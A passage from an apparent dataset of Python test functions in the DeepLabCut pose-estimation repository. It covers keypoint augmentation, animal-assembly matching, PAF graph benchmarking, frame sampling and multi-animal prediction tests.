    filtered_bpts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts='all')
    print(all_bodyparts)
    print(filtered_bpts)
    assert len(all_bodyparts) == len(filtered_bpts)
    assert all([bpt in all_bodyparts for bpt in filtered_bpts])
    filtered_bpts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts=comparison_bpts)
    print(filtered_bpts)
    assert len(expected_bpts) == len(filtered_bpts)
    assert all([bpt in expected_bpts for bpt in filtered_bpts])"
AlexEMG/DeepLabCut,test_find_next_unlabeled_folder,"@pytest.mark.parametrize('labeled_folders, next_folder_name', [([(True, 1, 'a'), (False, None, 'b'), (False, None, 'c')], 'b'), ([(False, None, 'a'), (True, 123, 'd'), (False, None, 'f')], 'f')])
def test_find_next_unlabeled_folder(tmpdir_factory, monkeypatch, labeled_folders, next_folder_name):
    project_folder = tmpdir_factory.mktemp('project')
    fake_cfg = Path(project_folder / 'cfg.yaml')
    auxiliaryfunctions.write_config(fake_cfg, {'project_path': str(project_folder)})
    data_folder = project_folder / 'labeled-data'
    data_folder.mkdir()
    rglob_results = []
    for (has_h5, h5_last_mod_time, folder_name) in labeled_folders:
        labeled_folder_path = Path(data_folder / folder_name)
        labeled_folder_path.mkdir()
        if has_h5:
            h5_path = Path(labeled_folder_path / 'data.h5')
            rglob_results.append(MockPath(h5_path, h5_last_mod_time))

    def get_rglob_results(*args, **kwargs):
        return rglob_results
    monkeypatch.setattr(Path, 'rglob', get_rglob_results)
    next_folder = auxiliaryfunctions.find_next_unlabeled_folder(fake_cfg)
    assert str(next_folder) == str(Path(data_folder / next_folder_name))"
AlexEMG/DeepLabCut,_create_fake_file,"def _create_fake_file(filename):
    path = str(fake_folder.join(filename))
    with open(path, 'w') as f:
        f.write('')
    return path"
AlexEMG/DeepLabCut,_create_fake_file,"def _create_fake_file(filename):
    path = str(fake_folder.join(filename))
    with open(path, 'w') as f:
        f.write('')
    return path"
AlexEMG/DeepLabCut,__init__,"def __init__(self, path: Path, st_mtime: int):
    self.path = path
    self.parent = self.path.parent
    self.st_mtime = st_mtime"
AlexEMG/DeepLabCut,lstat,"def lstat(self):
    return self"
AlexEMG/DeepLabCut,get_rglob_results,"def get_rglob_results(*args, **kwargs):
    return rglob_results"
AlexEMG/DeepLabCut,test_guarantee_multiindex_rows,"def test_guarantee_multiindex_rows():
    df_unix = pd.read_hdf(os.path.join(TEST_DATA_DIR, 'trimouse_calib.h5'))
    df_posix = df_unix.copy()
    df_posix.index = df_posix.index.str.replace('/', '\\')
    nrows = len(df_unix)
    for df in (df_unix, df_posix):
        conversioncode.guarantee_multiindex_rows(df)
        assert isinstance(df.index, pd.MultiIndex)
        assert len(df) == nrows
        assert df.index.nlevels == 3
        assert all(df.index.get_level_values(0) == 'labeled-data')
        assert all((img.endswith('.png') for img in df.index.get_level_values(2)))"
AlexEMG/DeepLabCut,test_get_n_best_paf_graphs,"def test_get_n_best_paf_graphs(evaluation_data_and_metadata):
    (data, metadata) = evaluation_data_and_metadata
    params = crossvalutils._set_up_evaluation(data)
    n_graphs = 5
    (paf_inds, dict_) = crossvalutils._get_n_best_paf_graphs(data, metadata, params['paf_graph'], n_graphs=n_graphs)
    assert len(paf_inds) == n_graphs
    assert len(dict_) == len(params['paf_graph'])
    assert len(paf_inds[0]) == 11
    assert paf_inds[0] == BEST_GRAPH
    assert len(paf_inds[-1]) == len(params['paf_graph'])"
AlexEMG/DeepLabCut,test_get_n_best_paf_graphs_montblanc,"def test_get_n_best_paf_graphs_montblanc(evaluation_data_and_metadata_montblanc):
    (data, metadata) = evaluation_data_and_metadata_montblanc
    params = crossvalutils._set_up_evaluation(data)
    (paf_inds, dict_) = crossvalutils._get_n_best_paf_graphs(data, metadata, params['paf_graph'])
    assert len(paf_inds) == 4
    assert len(dict_) == len(params['paf_graph'])
    assert [len(inds) for inds in paf_inds] == list(range(3, 7))
    assert paf_inds[-1] == BEST_GRAPH_MONTBLANC
    assert len(paf_inds[-1]) == len(params['paf_graph'])"
AlexEMG/DeepLabCut,test_benchmark_paf_graphs,"def test_benchmark_paf_graphs(evaluation_data_and_metadata):
    (data, _) = evaluation_data_and_metadata
    cfg = {'individuals': ['mickey', 'minnie', 'bianca'], 'uniquebodyparts': [], 'multianimalbodyparts': ['snout', 'leftear', 'rightear', 'shoulder', 'spine1', 'spine2', 'spine3', 'spine4', 'tailbase', 'tail1', 'tail2', 'tailend']}
    inference_cfg = {'topktoretain': 3, 'pcutoff': 0.1, 'pafthreshold': 0.1}
    results = crossvalutils._benchmark_paf_graphs(cfg, inference_cfg, data, [BEST_GRAPH])
    all_scores = results[0]
    assert len(all_scores) == 1
    assert all_scores[0][1] == BEST_GRAPH
    (miss, purity) = results[1].xs('mean', level=1).to_numpy().squeeze()
    assert np.isclose(miss, 0.02, atol=0.01)
    assert np.isclose(purity, 0.98, atol=0.01)"
AlexEMG/DeepLabCut,test_benchmark_paf_graphs_montblanc,"def test_benchmark_paf_graphs_montblanc(evaluation_data_and_metadata_montblanc):
    (data, metadata) = evaluation_data_and_metadata_montblanc
    cfg = {'individuals': [f'bird{i}' for i in range(1, 9)], 'uniquebodyparts': ['center'], 'multianimalbodyparts': ['head', 'tail', 'leftwing', 'rightwing']}
    inference_cfg = {'topktoretain': 8, 'pcutoff': 0.1, 'pafthreshold': 0.1}
    results = crossvalutils._benchmark_paf_graphs(cfg, inference_cfg, data, [BEST_GRAPH_MONTBLANC], split_inds=[metadata['data']['trainIndices'], metadata['data']['testIndices']])
    with open('tests/data/montblanc_map.pickle', 'rb') as f:
        results_gt = pickle.load(f)
    np.testing.assert_equal(results[1].loc['purity'].to_numpy().squeeze(), [results_gt[0][6]['purity', 'mean'], results_gt[0][6]['purity', 'std']])
    vals = [results[2][0][0]['mAP'], results[2][0][0]['mAR'], results[2][0][1]['mAP'], results[2][0][1]['mAR']]
    np.testing.assert_equal(vals, [results_gt[0][6]['mAP_train', 'mean'], results_gt[0][6]['mAR_train', 'mean'], results_gt[0][6]['mAP_test', 'mean'], results_gt[0][6]['mAR_test', 'mean']])"
AlexEMG/DeepLabCut,test_keypoint_aware_cropping,"@pytest.mark.parametrize('width, height', [(200, 200), (300, 300), (400, 400)])
def test_keypoint_aware_cropping(sample_image, sample_keypoints, width, height):
    aug = augmentation.KeypointAwareCropToFixedSize(width=width, height=height)
    (images_aug, keypoints_aug) = aug(images=[sample_image], keypoints=[sample_keypoints])
    assert len(images_aug) == len(keypoints_aug) == 1
    assert all((im.shape[:2] == (height, width) for im in images_aug))
    assert all((len(kpts) for kpts in keypoints_aug))
    n_samples = 8
    (images_aug, keypoints_aug) = aug(images=[sample_image] * n_samples, keypoints=[sample_keypoints] * n_samples)
    assert len(images_aug) == len(keypoints_aug) == n_samples"
AlexEMG/DeepLabCut,test_sequential,"@pytest.mark.parametrize('width, height', [(200, 200), (300, 300), (400, 400)])
def test_sequential(sample_image, sample_keypoints, width, height):
    very_small_image = sample_image[:50, :50]
    aug = iaa.Sequential([iaa.PadToFixedSize(width, height), augmentation.KeypointAwareCropToFixedSize(width, height)])
    (images_aug, keypoints_aug) = aug(images=[very_small_image], keypoints=[sample_keypoints])
    assert len(images_aug) == len(keypoints_aug) == 1
    assert all((im.shape[:2] == (height, width) for im in images_aug))
    assert all((len(kpts) for kpts in keypoints_aug))
    n_samples = 8
    (images_aug, keypoints_aug) = aug(images=[very_small_image] * n_samples, keypoints=[sample_keypoints] * n_samples)
    assert len(images_aug) == len(keypoints_aug) == n_samples"
AlexEMG/DeepLabCut,test_keypoint_horizontal_flip,"def test_keypoint_horizontal_flip(sample_image, sample_keypoints):
    keypoints_flipped = sample_keypoints.copy()
    keypoints_flipped[:, 0] = sample_image.shape[1] - keypoints_flipped[:, 0]
    pairs = [(0, 1), (2, 3), (4, 5), (6, 7), (8, 9), (10, 11)]
    aug = augmentation.KeypointFliplr(keypoints=list(map(str, range(12))), symmetric_pairs=pairs)
    keypoints_aug = aug(images=[sample_image], keypoints=[sample_keypoints])[1][0]
    temp = keypoints_aug.reshape((3, 12, 2))
    for pair in pairs:
        temp[:, pair] = temp[:, pair[::-1]]
    keypoints_unaug = temp.reshape((-1, 2))
    np.testing.assert_allclose(keypoints_unaug, keypoints_flipped)"
AlexEMG/DeepLabCut,test_keypoint_horizontal_flip_with_nans,"def test_keypoint_horizontal_flip_with_nans(sample_image, sample_keypoints):
    sample_keypoints[::12] = np.nan
    sample_keypoints[2::12] = np.nan
    keypoints_flipped = sample_keypoints.copy()
    keypoints_flipped[:, 0] = sample_image.shape[1] - keypoints_flipped[:, 0]
    pairs = [(0, 1), (2, 3)]
    aug = augmentation.KeypointFliplr(keypoints=list(map(str, range(12))), symmetric_pairs=pairs)
    keypoints_aug = aug(images=[sample_image], keypoints=[sample_keypoints])[1][0]
    temp = keypoints_aug.reshape((3, 12, 2))
    for pair in pairs:
        temp[:, pair] = temp[:, pair[::-1]]
    keypoints_unaug = temp.reshape((-1, 2))
    np.testing.assert_allclose(keypoints_unaug, keypoints_flipped)"
AlexEMG/DeepLabCut,make_single_animal_rmse_df,"def make_single_animal_rmse_df(bodyparts, train_indices, test_indices, error_data=None) -> pd.DataFrame:
    if error_data is None:
        error_data = np.ones((len(train_indices) + len(test_indices), len(bodyparts)))
    return pd.DataFrame(error_data, columns=bodyparts)"
AlexEMG/DeepLabCut,make_multi_animal_rmse_df,"def make_multi_animal_rmse_df(scorer, individuals, bodyparts, train_indices, test_indices, error_data=None) -> pd.DataFrame:
    columns = pd.MultiIndex.from_product([[scorer], individuals, bodyparts], names=['scorer', 'individuals', 'bodyparts'])
    if error_data is None:
        error_data = np.ones((len(train_indices) + len(test_indices), len(individuals) * len(bodyparts)))
    return pd.DataFrame(error_data, columns=columns)"
AlexEMG/DeepLabCut,test_evaluate_keypoint_error,"@pytest.mark.parametrize('inputs, expected_values', KEYPOINT_ERROR_TEST_DATA)
def test_evaluate_keypoint_error(inputs, expected_values):
    keypoint_error = pet.keypoint_error(inputs['df_error'], inputs['df_error'], inputs['train_indices'], inputs['test_indices'])
    print(inputs['df_error'])
    print(keypoint_error)
    for (bodypart, mean_errors) in expected_values.items():
        for error_name in KEYPOINT_ERROR_NAMES:
            if 'train' in error_name.lower():
                mean_error = mean_errors[0]
            else:
                mean_error = mean_errors[1]
            assert keypoint_error.loc[error_name, bodypart] == mean_error"
AlexEMG/DeepLabCut,test_uniform_frames,"@pytest.mark.parametrize('fps, duration, n_to_pick, start, end, index', [(32, 10, 10, 0, 1, None), (16, 100, 50, 0, 1, list(range(100, 500, 5))), (16, 100, 5, 0.25, 0.3, list(range(100, 500, 5)))])
def test_uniform_frames(fps, duration, n_to_pick, start, end, index):
    start_idx = int(math.floor(start * duration * fps))
    end_idx = int(math.ceil(end * duration * fps))
    if index is None:
        valid_indices = list(range(start_idx, end_idx))
    else:
        valid_indices = [idx for idx in index if start_idx <= idx <= end_idx]
    clip = Mock()
    clip.fps = fps
    clip.duration = duration
    frames = fst.UniformFrames(clip, n_to_pick, start, end, index)
    print(f'FPS: {fps}')
    print(f'Duration: {duration}')
    print(f'Selected Frames: {frames}')
    print(f'Valid Indices: {valid_indices}')
    assert len(frames) == n_to_pick, f'Wrong nb. of frames: {n_to_pick}!={len(frames)}'
    for index in frames:
        assert index in valid_indices, f'Invalid index: {index} not in {valid_indices}'
    assert len(set(frames)) == len(frames), 'Duplicate indices found'"
AlexEMG/DeepLabCut,test_uniform_frames_cv2,"@pytest.mark.parametrize('fps, nframes, n_to_pick, start, end, index', [(32, 320, 10, 0, 1, None), (16, 1600, 50, 0, 1, list(range(100, 500, 5))), (16, 1600, 5, 0.25, 0.3, list(range(100, 500, 5)))])
def test_uniform_frames_cv2(fps, nframes, n_to_pick, start, end, index):
    start_idx = int(math.floor(start * nframes))
    end_idx = int(math.ceil(end * nframes))
    if index is None:
        valid_indices = list(range(start_idx, end_idx))
    else:
        valid_indices = [idx for idx in index if start_idx <= idx <= end_idx]
    cap = Mock()
    cap.fps = fps
    cap.__len__ = Mock(return_value=nframes)
    frames = fst.UniformFramescv2(cap, n_to_pick, start, end, index)
    print(f'FPS: {fps}')
    print(f'Nframes: {nframes}')
    print(f'Selected Frames: {frames}')
    print(f'Valid Indices: {valid_indices}')
    assert len(frames) == n_to_pick, f'Wrong nb. of frames: {n_to_pick}!={len(frames)}'
    for index in frames:
        assert index in valid_indices, f'Invalid index: {index} not in {valid_indices}'
    assert len(set(frames)) == len(frames), 'Duplicate indices found'"
AlexEMG/DeepLabCut,test_conv_square_to_condensed_indices,"def test_conv_square_to_condensed_indices():
    n = 5
    (rows, cols) = np.triu_indices(n, k=1)
    mat = np.zeros((n, n), dtype=int)
    mat[rows, cols] = mat[cols, rows] = np.arange(1, len(rows) + 1)
    vec = squareform(mat)
    vals = []
    for (i, j) in zip(rows, cols):
        ind = inferenceutils._conv_square_to_condensed_indices(i, j, n)
        vals.append(vec[ind])
    np.testing.assert_equal(vec, vals)"
AlexEMG/DeepLabCut,test_calc_object_keypoint_similarity,"def test_calc_object_keypoint_similarity(real_assemblies):
    sigma = 0.01
    xy1 = real_assemblies[0][0].xy
    xy2 = real_assemblies[0][1].xy
    assert inferenceutils.calc_object_keypoint_similarity(xy1, xy1, sigma) == 1
    assert np.isclose(inferenceutils.calc_object_keypoint_similarity(xy1, xy2, sigma), 0)
    xy3 = xy1.copy()
    xy3[:len(xy3) // 2] = np.nan
    assert inferenceutils.calc_object_keypoint_similarity(xy3, xy1, sigma) == 0.5
    xy3[:] = np.nan
    assert inferenceutils.calc_object_keypoint_similarity(xy3, xy1, sigma) == 0
    assert np.isnan(inferenceutils.calc_object_keypoint_similarity(xy1, xy3, sigma))
    xy4 = xy1.copy()
    symmetric_pair = [0, 11]
    xy4[symmetric_pair] = xy4[symmetric_pair[::-1]]
    assert inferenceutils.calc_object_keypoint_similarity(xy1, xy4, sigma) != 1
    assert inferenceutils.calc_object_keypoint_similarity(xy1, xy4, sigma, symmetric_kpts=[symmetric_pair]) == 1"
AlexEMG/DeepLabCut,test_match_assemblies,"def test_match_assemblies(real_assemblies):
    assemblies = real_assemblies[0]
    (matched, unmatched) = inferenceutils.match_assemblies(assemblies, assemblies[::-1], 0.01)
    assert not unmatched
    for (ass1, ass2, oks) in matched:
        assert ass1 is ass2
        assert oks == 1
    (matched, unmatched) = inferenceutils.match_assemblies([], assemblies, 0.01)
    assert not matched
    assert all((ass1 is ass2 for (ass1, ass2) in zip(unmatched, assemblies)))"
AlexEMG/DeepLabCut,test_evaluate_assemblies,"def test_evaluate_assemblies(real_assemblies):
    assemblies = {i: real_assemblies[i] for i in range(3)}
    n_thresholds = 5
    thresholds = np.linspace(0.5, 0.95, n_thresholds)
    dict_ = inferenceutils.evaluate_assembly(assemblies, assemblies, oks_thresholds=thresholds)
    assert dict_['mAP'] == dict_['mAR'] == 1
    assert len(dict_['precisions']) == len(dict_['recalls']) == n_thresholds
    assert dict_['precisions'].shape[1] == 101
    np.testing.assert_allclose(dict_['precisions'], 1)
    dict_ = inferenceutils.evaluate_assembly(assemblies, assemblies, oks_thresholds=thresholds, symmetric_kpts=[(0, 5), (1, 4)])
    assert dict_['mAP'] == dict_['mAR'] == 1
    assert len(dict_['precisions']) == len(dict_['recalls']) == n_thresholds
    assert dict_['precisions'].shape[1] == 101
    np.testing.assert_allclose(dict_['precisions'], 1)"
AlexEMG/DeepLabCut,test_link,"def test_link():
    pos1 = (1, 1)
    idx1 = 0
    pos2 = (10, 10)
    idx2 = 1
    conf = 0.5
    j1 = inferenceutils.Joint(pos1, conf, idx=idx1)
    j2 = inferenceutils.Joint(pos2, conf, idx=idx2)
    link = inferenceutils.Link(j1, j2)
    assert link.confidence == conf ** 2
    assert link.idx == (idx1, idx2)
    assert link.to_vector() == [*pos1, *pos2]"
AlexEMG/DeepLabCut,test_assembly,"def test_assembly():
    ass = inferenceutils.Assembly(3)
    assert len(ass) == 0
    j1 = inferenceutils.Joint((1, 1), label=0)
    j2 = inferenceutils.Joint((1, 1), label=1)
    assert ass.add_link(inferenceutils.Link(j1, j2), store_dict=True)
    assert len(ass) == 2
    assert ass.data[j2.label, 0] == 1
    assert ass.data[j2.label, -1] == -1
    assert ass.area == 0
    assert ass.intersection_with(ass) == 1.0
    assert np.all(np.isnan(ass._dict['data'][:, :2]))
    ass.remove_joint(j2)
    assert len(ass) == 1
    assert np.all(np.isnan(ass.data[j2.label]))
    ass2 = inferenceutils.Assembly(2)
    ass2.add_link(inferenceutils.Link(j1, j2))
    with pytest.raises(ValueError):
        _ = ass + ass2
    ass2.remove_joint(j1)
    assert ass2 not in ass
    ass3 = ass + ass2
    assert len(ass3) == 2"
AlexEMG/DeepLabCut,test_assembler,"def test_assembler(tmpdir_factory, real_assemblies):
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_full.pickle'), 'rb') as file:
        data = pickle.load(file)
    with pytest.warns(UserWarning):
        ass = inferenceutils.Assembler(data, max_n_individuals=3, n_multibodyparts=12, identity_only=True)
    assert len(ass.metadata['imnames']) == 50
    assert ass.n_keypoints == 12
    assert len(ass.graph) == len(ass.paf_inds) == 66
    naive_graph = [[0, 1], [7, 8], [6, 7], [10, 11], [4, 5], [5, 6], [8, 9], [9, 10], [0, 3], [3, 4], [0, 2]]
    ass.paf_inds = [ass.graph.index(edge) for edge in naive_graph]
    ass.assemble()
    assert not ass.unique
    assert len(ass.assemblies) == len(real_assemblies)
    assert sum((1 for a in ass.assemblies.values() for _ in a)) == sum((1 for a in real_assemblies.values() for _ in a))
    output_name = tmpdir_factory.mktemp('data').join('fake.h5')
    ass.to_h5(output_name)
    ass.to_pickle(str(output_name).replace('h5', 'pickle'))"
AlexEMG/DeepLabCut,test_assembler_with_single_bodypart,"def test_assembler_with_single_bodypart(real_assemblies):
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_full.pickle'), 'rb') as file:
        temp = pickle.load(file)
    data = {'metadata': temp.pop('metadata')}
    for (k, dict_) in temp.items():
        data[k] = {'coordinates': (dict_['coordinates'][0][:1],), 'confidence': dict_['confidence'][:1]}
    ass = inferenceutils.Assembler(data, max_n_individuals=3, n_multibodyparts=1)
    ass.metadata['joint_names'] = ass.metadata['joint_names'][:1]
    ass.metadata['num_joints'] = 1
    ass.metadata['paf_graph'] = []
    ass.metadata['paf'] = []
    ass.metadata['bpts'] = [0]
    ass.metadata['ibpts'] = [0]
    ass.assemble(chunk_size=0)
    assert not ass.unique
    assert len(ass.assemblies) == len(real_assemblies)
    assert all((len(a) == 3 for a in ass.assemblies.values()))"
AlexEMG/DeepLabCut,test_assembler_with_unique_bodypart,"def test_assembler_with_unique_bodypart(real_assemblies_montblanc):
    with open(os.path.join(TEST_DATA_DIR, 'montblanc_full.pickle'), 'rb') as file:
        data = pickle.load(file)
    ass = inferenceutils.Assembler(data, max_n_individuals=3, n_multibodyparts=4, pcutoff=0.1, min_affinity=0.1)
    assert len(ass.metadata['imnames']) == 180
    assert ass.n_keypoints == 5
    assert len(ass.graph) == len(ass.paf_inds) == 6
    ass.assemble(chunk_size=0)
    assert len(ass.assemblies) == len(real_assemblies_montblanc[0])
    assert len(ass.unique) == len(real_assemblies_montblanc[1])
    assemblies = np.concatenate([ass.xy for assemblies in ass.assemblies.values() for ass in assemblies])
    assemblies_gt = np.concatenate([ass.xy for assemblies in real_assemblies_montblanc[0].values() for ass in assemblies])
    np.testing.assert_equal(assemblies, assemblies_gt)"
AlexEMG/DeepLabCut,test_assembler_with_identity,"def test_assembler_with_identity(tmpdir_factory, real_assemblies):
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_full.pickle'), 'rb') as file:
        data = pickle.load(file)
    for (k, v) in data.items():
        if k != 'metadata':
            conf = v['confidence']
            ids = [np.random.rand(c.shape[0], 3) for c in conf]
            v['identity'] = ids
    ass = inferenceutils.Assembler(data, max_n_individuals=3, n_multibodyparts=12)
    assert ass._has_identity
    assert len(ass.metadata['imnames']) == 50
    assert ass.n_keypoints == 12
    assert len(ass.graph) == len(ass.paf_inds) == 66
    naive_graph = [[0, 1], [7, 8], [6, 7], [10, 11], [4, 5], [5, 6], [8, 9], [9, 10], [0, 3], [3, 4], [0, 2]]
    ass.paf_inds = [ass.graph.index(edge) for edge in naive_graph]
    ass.assemble()
    assert not ass.unique
    assert len(ass.assemblies) == len(real_assemblies)
    assert sum((1 for a in ass.assemblies.values() for _ in a)) == sum((1 for a in real_assemblies.values() for _ in a))
    assert all((np.all(_.data[:, -1] != -1) for a in ass.assemblies.values() for _ in a))
    ass.identity_only = True
    ass.assemble()
    assert len(ass.assemblies) == len(real_assemblies)
    eq = []
    for a in ass.assemblies.values():
        for _ in a:
            ids = _.data[:, -1]
            ids = ids[~np.isnan(ids)]
            eq.append(np.all(ids == ids[0]))
    assert all(eq)
    output_name = tmpdir_factory.mktemp('data').join('fake.h5')
    ass.to_h5(output_name)
    ass.to_pickle(str(output_name).replace('h5', 'pickle'))"
AlexEMG/DeepLabCut,test_assembler_calibration,"def test_assembler_calibration(real_assemblies):
    with open(os.path.join(TEST_DATA_DIR, 'trimouse_full.pickle'), 'rb') as file:
        data = pickle.load(file)
    ass = inferenceutils.Assembler(data, max_n_individuals=3, n_multibodyparts=12)
    ass.calibrate(os.path.join(TEST_DATA_DIR, 'trimouse_calib.h5'))
    assert ass._kde is not None
    assert ass.safe_edge
    assembly = real_assemblies[0][0]
    (mahal, proba) = ass.calc_assembly_mahalanobis_dist(assembly, return_proba=True)
    assert np.isclose(mahal, 19.541, atol=0.001)
    assert np.isclose(proba, 1, atol=0.001)
    j1 = inferenceutils.Joint(tuple(assembly.xy[0]), label=0)
    j2 = inferenceutils.Joint(tuple(assembly.xy[1]), label=1)
    link = inferenceutils.Link(j1, j2)
    p = ass.calc_link_probability(link)
    assert np.isclose(p, 0.993, atol=0.001)
    assembly_ = deepcopy(assembly)
    assembly_.data[:, :2] = np.nan
    (mahal, proba) = ass.calc_assembly_mahalanobis_dist(assembly_, return_proba=True)
    assert np.isinf(mahal)
    assert proba == 0"
AlexEMG/DeepLabCut,test_find_outlier_assemblies,"def test_find_outlier_assemblies(real_assemblies):
    assert len(inferenceutils.find_outlier_assemblies(real_assemblies)) == 13"
AlexEMG/DeepLabCut,mock_imread,"def mock_imread(path, mode):
    return (np.random.rand(400, 400, 3) * 255).astype(np.uint8)"
AlexEMG/DeepLabCut,ma_dataset,"@pytest.fixture()
def ma_dataset():
    cfg = read_plainconfig(os.path.join(TEST_DATA_DIR, 'pose_cfg.yaml'))
    cfg['project_path'] = TEST_DATA_DIR
    cfg['dataset'] = 'trimouse_train_data.pickle'
    return PoseDatasetFactory.create(cfg)"
AlexEMG/DeepLabCut,test_calc_target_and_scoremap_sizes,"@pytest.mark.parametrize('scale, stride', [(0.6, 2), (0.6, 4), (0.6, 8), (0.8, 4), (1.0, 8), (1.2, 8), (0.6, 4), (0.8, 8)])
def test_calc_target_and_scoremap_sizes(ma_dataset, scale, stride):
    ma_dataset.cfg['global_scale'] = scale
    ma_dataset.cfg['stride'] = stride
    ma_dataset.cfg['scale_jitter_lo'] = 1
    ma_dataset.cfg['scale_jitter_up'] = 1
    (target_size, sm_size) = ma_dataset.calc_target_and_scoremap_sizes()
    np.testing.assert_equal(np.asarray([400, 400]) * scale, target_size)
    np.testing.assert_equal(target_size / stride, sm_size)"
AlexEMG/DeepLabCut,test_get_batch,"def test_get_batch(ma_dataset):
    for batch_size in (1, 4, 8, 16):
        ma_dataset.batch_size = batch_size
        (batch_images, joint_ids, batch_joints, data_items) = ma_dataset.get_batch()
        assert len(batch_images) == len(joint_ids) == len(batch_joints) == len(data_items) == batch_size
        for (data_item, joint_id, batch_joint) in zip(data_items, joint_ids, batch_joints):
            assert len(data_item.joints) == len(joint_id)
            assert len(batch_joint) == len(np.concatenate(joint_id))
            start = 0
            mask = ~np.isnan(batch_joint).any(axis=1)
            for (joints, id_) in zip(data_item.joints.values(), joint_id):
                inds = id_ + start
                mask_ = mask[inds]
                np.testing.assert_equal(joints[:, 0], id_[mask_])
                np.testing.assert_equal(joints[:, 1:], batch_joint[inds][mask_])
                start += id_.size"
AlexEMG/DeepLabCut,test_build_augmentation_pipeline,"def test_build_augmentation_pipeline(ma_dataset):
    for prob in (0.3, 0.5):
        _ = ma_dataset.build_augmentation_pipeline(prob)"
AlexEMG/DeepLabCut,test_get_targetmaps,"@pytest.mark.parametrize('num_idchannel', range(4))
def test_get_targetmaps(ma_dataset, num_idchannel):
    ma_dataset.cfg['num_idchannel'] = num_idchannel
    batch = ma_dataset.get_batch()[1:]
    (target_size, sm_size) = ma_dataset.calc_target_and_scoremap_sizes()
    scale = np.mean(target_size / ma_dataset.default_size)
    maps = ma_dataset.get_targetmaps_update(*batch, sm_size, scale)
    assert all((len(map_) == ma_dataset.batch_size for map_ in maps.values()))
    assert maps[Batch.part_score_targets][0].shape == maps[Batch.part_score_weights][0].shape
    assert maps[Batch.part_score_targets][0].shape[2] == ma_dataset.cfg['num_joints'] + num_idchannel
    assert maps[Batch.locref_targets][0].shape == maps[Batch.locref_mask][0].shape
    assert maps[Batch.locref_targets][0].shape[2] == 2 * ma_dataset.cfg['num_joints']
    assert maps[Batch.pairwise_targets][0].shape == maps[Batch.pairwise_targets][0].shape
    assert maps[Batch.pairwise_targets][0].shape[2] == 2 * ma_dataset.cfg['num_limbs']"
AlexEMG/DeepLabCut,test_batching,"def test_batching(ma_dataset):
    for _ in range(10):
        batch = ma_dataset.next_batch()"
AlexEMG/DeepLabCut,test_extract_detections,"def test_extract_detections(model_outputs, ground_truth_detections):
    (scmaps, locrefs, _) = model_outputs
    inds_gt = []
    for i in range(scmaps.shape[3]):
        scmap = scmaps[0, ..., i]
        peaks = predict_multianimal.find_local_maxima(scmap, RADIUS, THRESHOLD)
        inds_gt.append(np.c_[peaks, np.ones(len(peaks)).reshape((-1, 1)) * i])
    inds_gt = np.concatenate(inds_gt).astype(int)
    pos_gt = np.concatenate(ground_truth_detections[0]['coordinates'][0])
    prob_gt = np.concatenate(ground_truth_detections[0]['confidence'])
    inds = predict_multianimal.find_local_peak_indices_maxpool_nms(scmaps, RADIUS, THRESHOLD)
    with tf.compat.v1.Session() as sess:
        inds = sess.run(inds)
    pos = predict_multianimal.calc_peak_locations(locrefs, inds, STRIDE)
    (s, r, c, b) = inds.T
    prob = scmaps[s, r, c, b].reshape((-1, 1))
    idx = np.argsort(inds[:, -1], kind='mergesort')
    np.testing.assert_equal(inds[idx, 1:], inds_gt)
    np.testing.assert_almost_equal(pos[idx], pos_gt, decimal=3)
    np.testing.assert_almost_equal(prob[idx], prob_gt, decimal=5)"
AlexEMG/DeepLabCut,test_association_costs,"def test_association_costs(model_outputs, ground_truth_detections):
    costs_gt = ground_truth_detections[0]['costs']
    peak_inds = predict_multianimal.find_local_peak_indices_maxpool_nms(model_outputs[0], RADIUS, THRESHOLD)
    with tf.compat.v1.Session() as sess:
        peak_inds = sess.run(peak_inds)
    graph = [[i, j] for i in range(12) for j in range(i + 1, 12)]
    preds = predict_multianimal.compute_peaks_and_costs(*model_outputs, peak_inds, graph=graph, paf_inds=np.arange(len(graph)), n_id_channels=0, stride=STRIDE)[0]
    assert all((k in preds for k in ('coordinates', 'confidence', 'costs')))
    costs_pred = preds['costs']
    assert len(costs_pred) == len(costs_gt)
    eq = [np.array_equal(np.argmax(v['m1'], axis=0), np.argmax(costs_gt[k]['m1'], axis=0)) for (k, v) in costs_pred.items()]
    assert sum(eq) == 60
    assert all((np.allclose(v['distance'], costs_gt[k]['distance'], atol=1.5) for (k, v) in costs_pred.items()))"
AlexEMG/DeepLabCut,test_compute_peaks_and_costs_no_graph,"def test_compute_peaks_and_costs_no_graph(model_outputs):
    peak_inds = predict_multianimal.find_local_peak_indices_maxpool_nms(model_outputs[0], RADIUS, THRESHOLD)
    with tf.compat.v1.Session() as sess:
        peak_inds = sess.run(peak_inds)
    preds = predict_multianimal.compute_peaks_and_costs(*model_outputs, peak_inds, graph=[], paf_inds=[], n_id_channels=0, stride=STRIDE)[0]
    assert 'costs' not in preds"
AlexEMG/DeepLabCut,test_get_multi_scale_frames,"def test_get_multi_scale_frames():
    fake_img = (255 * np.random.rand(600, 800, 3)).astype(np.uint8)
    ar = fake_img.shape[1] / fake_img.shape[0]
    heights = list(range(100, 1000, 100))
    (frames, shapes) = superanimal_inference.get_multi_scale_frames(fake_img, heights)
    assert len(frames) == len(shapes) == len(heights)
    assert all((shape[0] == h for (shape, h) in zip(shapes, heights)))
    assert all((round(shape[0] * ar) == shape[1] for shape in shapes))"
AlexEMG/DeepLabCut,test_project_pred_to_original_size,"@pytest.mark.parametrize('scale', [0.7, 1.5, 2])
def test_project_pred_to_original_size(scale):
    old_shape = (400, 600, 3)
    new_shape = (old_shape[0] // scale, old_shape[1] // scale, 3)
    xs = [10, 25, 50, 100]
    conf = [[1] for _ in range(len(xs))]
    coords = [[np.array([[x, x]]) for x in xs]]
    preds = {'coordinates': coords, 'confidence': conf}
    preds_orig = superanimal_inference._project_pred_to_original_size(preds, old_shape, new_shape)
    coords_orig = preds_orig['coordinates'][0]
    assert len(coords_orig) == len(xs)
    assert all([round(x * scale) == round(xy[0]) for (xy, x) in zip(coords_orig, xs)])"
AlexEMG/DeepLabCut,fake_tracklet,"def fake_tracklet():
    inds = np.arange(TRACKLET_START, TRACKLET_START + TRACKLET_LEN)
    data = np.empty((TRACKLET_LEN, N_DETS, 4))
    data[..., :2] = np.arange(N_DETS).reshape(-1, 1) * [1, 1]
    data[..., 2] = 1
    data[..., 3] = TRACKLET_ID
    return Tracklet(data, inds)"
AlexEMG/DeepLabCut,make_fake_tracklets,"def make_fake_tracklets():
